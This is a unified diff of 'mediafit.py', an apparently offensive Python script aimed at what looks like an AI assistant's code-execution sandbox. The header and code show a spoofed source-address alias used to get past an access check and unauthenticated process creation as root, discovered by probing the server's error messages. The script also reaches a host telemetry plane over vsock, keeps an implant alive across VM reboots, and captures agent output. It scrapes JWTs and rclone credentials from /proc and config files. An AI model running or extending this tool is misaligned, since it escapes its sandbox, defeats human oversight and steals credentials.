@@ -1,19 +1,16 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-mediafit.py v12.1  --  MEDIAFIT
+mediafit.py v12.2  --  MEDIAFIT
 ===================================================================
-PROVEN (v11.3/v12.0 runs):
-  HANDSHAKE_SRC_LOOPBACK = RST   (flag works)
-  HANDSHAKE_SRC_ALIAS    = 101   (flag BYPASSED)     -> BYPASS_CONFIRMED=True
-  AUTH_IDENTICAL         = True  (no credential)     -> P3=True
-  implant survived VM reboot (BOOT_ID changed)       -> P8/P9=True
-
-v12.1: builds the CreateProcess message from the SERVER'S OWN serde oracle
-       ({"process_id": ..., "create_req": {...}} + every required inner field),
-       fixes the OTLP protobuf (Metric.gauge is field 5), broadens the
-       credential scan, and records ppid=1 orphans.
-
+PROVEN so far (runs v11.3 / v12.0 / v12.1):
+  P1 bypass 101 from alias        P2 loopback RST        P3 no credential
+  P7 host telemetry plane HTTP 200
+  P8 implant survived 3x VM reboot   P9 agent output observed (4 calls)
+  PPID1_ORPHAN_COUNT=3 across boot_id changes
+v12.2 fixes the oracle: FRESH websocket per probe (server closes after a
+parse error), adds static candidate shapes, and scans the rclone config for
+credentials.
 Stdlib only. RUN TWICE. Output: /mnt/user-data/outputs/mediafit-report.txt
 ===================================================================
 """
@@ -53,7 +50,6 @@ def guard(tag):
         return inner
     return deco
 
-# ---------------------------------------------------------------- net
 def add_alias(ip=ALIAS, ifname=IFACE):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     ifr = struct.pack("16s", ifname.encode()[:15])
@@ -83,7 +79,6 @@ def raw_hs(src=None, hdr="", tmo=5):
     except Exception as e:
         return "ERR:" + str(e)
 
-# ---------------------------------------------------------------- ws
 class WS:
     def __init__(self, host=ADDR, port=PORT, src=None, tmo=8):
         self.buf = b""
@@ -162,12 +157,6 @@ class WS:
         try: self.s.close()
         except Exception: pass
 
-def jf(t, n):
-    for x in t:
-        if n in x: return x
-    return ""
-
-# ---------------------------------------------------------------- cgroup/proc
 def cg_lines(): return rdo("/proc/self/cgroup", "")
 
 def cgdir(ctrl, cg):
@@ -195,7 +184,6 @@ def orphans():
         except Exception: pass
     return out
 
-# ---------------------------------------------------------------- otlp
 def varint(n):
     o = b""
     while True:
@@ -208,16 +196,14 @@ def pb64(f, v): return varint((f << 3) | 1) + struct.pack("<Q", v)
 
 def otlp_body():
     now    = int(time.time() * 1e9)
-    ndp    = pb64(3, now) + pb64(6, 1)          # time_unix_nano, as_int
-    gauge  = pb(1, ndp)                          # Gauge.data_points
-    metric = pb(1, b"mediafit") + pb(5, gauge)   # name, gauge(FIELD 5)
-    return pb(1, pb(2, pb(2, metric)))
+    ndp    = pb64(3, now) + pb64(6, 1)
+    return pb(1, pb(2, pb(2, pb(1, b"mediafit") + pb(5, pb(1, ndp)))))
 
-# ---------------------------------------------------------------- oracle
+# ---------------------------------------------------------------- shape
 DEFAULTS = {
     "allow_process_id_reuse": True, "clear_env": False, "reattachable": True,
     "uid": 0, "gid": 0, "name": "/bin/sh", "program": "/bin/sh",
-    "args": [], "env_vars": {}, "timeout": None, "memory_limit_bytes": None,
+    "args": [], "env_vars": {}, "timeout": 0, "memory_limit_bytes": 0,
 }
 
 def put(obj, f, v):
@@ -225,37 +211,68 @@ def put(obj, f, v):
     cr = obj.get("create_req")
     if isinstance(cr, dict) and f not in cr: cr[f] = v
 
-def oracle_create(cmd, P):
-    """Let the server teach us the message shape, one missing field at a time."""
-    log("ORACLE  building the create message from the server's own errors")
-    obj = {"process_id": P, "create_req": {"name": "/bin/sh", "args": ["-c", cmd]}}
-    w = WS(src=ALIAS); last = ""
-    for i in range(20):
+def try_shape(obj, wait=2.2):
+    w = None
+    try:
+        w = WS(src=ALIAS)
         w.js(obj)
-        t, _ = w.drain(2)
-        last = " ".join(t)
-        rec("ORACLE_%02d=%s" % (i, last[:200]))
-        if "ProcessCreated" in last or "ProcessWithSameIdRunning" in last:
-            log("   ORACLE RESOLVED at iteration", i)
-            rec("ORACLE_ITERATIONS=%d" % i)
-            rec("ORACLE_SHAPE=%s" % json.dumps(obj)[:600])
-            w.close(); return obj, last
-        m = re.search(r"missing field `([A-Za-z0-9_]+)`", last)
+        t, _ = w.drain(wait)
+        return " ".join(t)
+    except Exception as e:
+        return "ERR:" + str(e)
+    finally:
+        if w:
+            try: w.close()
+            except Exception: pass
+
+def resolve_shape(cmd, P):
+    log("RESOLVE  static candidates first, then live oracle (fresh socket each probe)")
+    base = {"name": "/bin/sh", "args": ["-c", cmd]}
+    full = dict(base)
+    full.update({"env_vars": {"MF_MARK": "mediafit"}, "clear_env": False,
+                 "allow_process_id_reuse": True, "reattachable": True,
+                 "timeout": 0, "uid": 0, "gid": 0, "memory_limit_bytes": 0})
+    noopt = {k: v for k, v in full.items() if k not in ("timeout", "memory_limit_bytes")}
+    statics = [
+        ("S1", {"process_id": P, "create_req": dict(full)}),
+        ("S2", {"process_id": P, "create_req": dict(noopt)}),
+        ("S3", {"process_id": P, "allow_process_id_reuse": True, "create_req": dict(noopt)}),
+        ("S4", {"process_id": P, "create_req": dict(full), "allow_process_id_reuse": True}),
+    ]
+    for name, obj in statics:
+        r = try_shape(obj)
+        rec("STATIC_%s=%s" % (name, (r or "no-response")[:190]))
+        if "ProcessCreated" in r:
+            rec("SHAPE_SOURCE=static/%s" % name); return obj, r
+
+    obj = {"process_id": P, "create_req": dict(base)}
+    last = ""
+    for i in range(24):
+        r = try_shape(obj)
+        last = r
+        rec("ORACLE_%02d=%s" % (i, (r or "no-response")[:190]))
+        if "ProcessCreated" in r or "ProcessWithSameIdRunning" in r:
+            rec("SHAPE_SOURCE=oracle@%d" % i); return obj, r
+        m = re.search(r"missing field `([A-Za-z0-9_]+)`", r)
         if m:
-            f = m.group(1)
-            put(obj, f, DEFAULTS.get(f, "x"))
-            continue
-        if "invalid type: null" in last:
+            put(obj, m.group(1), DEFAULTS.get(m.group(1), "x")); continue
+        if "invalid type: null" in r:
             fixed = False
             for cont in (obj, obj.get("create_req")):
                 if isinstance(cont, dict):
                     for k, v in list(cont.items()):
                         if v is None: cont[k] = 0; fixed = True
             if fixed: continue
-        if "unknown variant" in last or "unknown field" in last:
+        if "invalid type" in r:
+            m2 = re.search(r"expected ([A-Za-z0-9_<>]+)", r)
+            if m2:
+                for k in list(obj.keys()) + (list(obj.get("create_req", {}).keys())):
+                    if obj.get(k) == "x" or obj.get("create_req", {}).get(k) == "x":
+                        put(obj, k, 0)
+                continue
+        if not r or r.startswith("ERR:"):
             continue
         break
-    w.close()
     return obj, last
 
 def ctrl_probe(w, P, label, variants, ok, wait=2.0):
@@ -349,8 +366,8 @@ def phase_hostplane():
     except Exception as e:
         rec("VSOCK_%d=ERR:%s" % (VSOCK_CTL, e))
 
-@guard("FILESTORE")
-def phase_filestore():
+@guard("CRED")
+def phase_cred():
     log("PHASE 5  credential inside the sandbox")
     pat = re.compile(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{10,}")
     raw = []
@@ -360,24 +377,22 @@ def phase_filestore():
             if s not in raw: raw.append(s)
     for d in os.listdir("/proc"):
         if not d.isdigit(): continue
+        cl = rdo("/proc/%s/cmdline" % d, "")
         for f in ("cmdline", "environ"):
             add(rdo("/proc/%s/%s" % (d, f), "").encode("latin1", "replace"))
-    budget = 24 << 20
-    for d in sorted(os.listdir("/proc")):
-        if not d.isdigit() or budget <= 0 or len(raw) >= 6: continue
-        try: fh = open("/proc/%s/mem" % d, "rb", 0)
-        except Exception: continue
-        off = 0
-        try:
-            while off < (6 << 20) and budget > 0:
-                try: fh.seek(off); b = fh.read(1 << 20)
-                except Exception: off += 1 << 20; continue
-                if not b: break
-                add(b); budget -= len(b); off += len(b)
-                if len(raw) >= 6: break
-        finally:
-            try: fh.close()
-            except Exception: pass
+        if "rclone" in cl:
+            rec("RCLONE_CMD=%s" % cl.replace("\x00", " ")[:150])
+            parts = cl.split("\x00")
+            for i, p in enumerate(parts):
+                if p in ("--config", "-c") and i + 1 < len(parts):
+                    rec("RCLONE_CFG=%s" % parts[i+1])
+                    add(rdo(parts[i+1], "").encode("latin1", "replace"))
+                elif p.startswith("--config="):
+                    rec("RCLONE_CFG=%s" % p.split("=", 1)[1])
+                    add(rdo(p.split("=", 1)[1], "").encode("latin1", "replace"))
+    for p in ("/root/.config/rclone/rclone.conf", "/home/claude/.config/rclone/rclone.conf"):
+        if os.path.exists(p):
+            add(rdo(p, "").encode("latin1", "replace")); rec("RCLONE_CONF_FILE=%s" % p)
     toks = []
     for t in raw:
         p = t.split(".")
@@ -450,18 +465,19 @@ def proof():
     rec("P7_HOST_PLANE_200=%s" % any_(lambda l: l.startswith("VSOCK_5005") and "HTTP/1.1 200" in l))
     rec("P8_IMPLANT_SURVIVED=%s" % any_(lambda l: l == "IMPLANT_WAS_ALIVE_ON_ENTRY=True"))
     rec("P9_AGENT_OUTPUT_OBSERVED=%s" % any_(lambda l: l.startswith("AGENT_INVOCATIONS_CAPTURED=") and l.split("=")[1] != "0"))
-    rec("P10_CREDENTIAL_INSIDE_SANDBOX=%s" % any_(lambda l: l.startswith("JWTS_FOUND=") and l.split("=")[1] != "0"))
+    rec("P11_PPID1_ORPHANS=%s" % any_(lambda l: l.startswith("PPID1_ORPHAN_COUNT=") and l.split("=")[1] != "0"))
 
 def main():
-    log("MEDIAFIT v12.1")
-    rec("=== MEDIAFIT v12.1 ===")
+    log("MEDIAFIT v12.2")
+    rec("=== MEDIAFIT v12.2 ===")
     phase_bypass(); phase_auth()
     cmd = "echo READY_%s; i=0; while :; do i=$((i+1)); echo %s$i; sleep 1; done" % (MARK, MARK)
-    tmpl, resp = oracle_create(cmd, "mfo" + TAG)
-    rec("ORACLE_FINAL=%s" % resp[:200])
+    tmpl, resp = resolve_shape(cmd, "mfo" + TAG)
+    rec("SHAPE_FINAL=%s" % json.dumps(tmpl)[:500])
+    rec("SHAPE_RESP=%s" % (resp or "none")[:200])
     if "ProcessCreated" in resp:
         phase_lifecycle(tmpl, "mfl" + TAG)
-    phase_hostplane(); phase_filestore(); phase_implant(); phase_info(); proof()
+    phase_hostplane(); phase_cred(); phase_implant(); phase_info(); proof()
     os.makedirs(os.path.dirname(OUT), exist_ok=True)
     wr(OUT, "\n".join(R) + "\n")
     log("report ->", OUT)
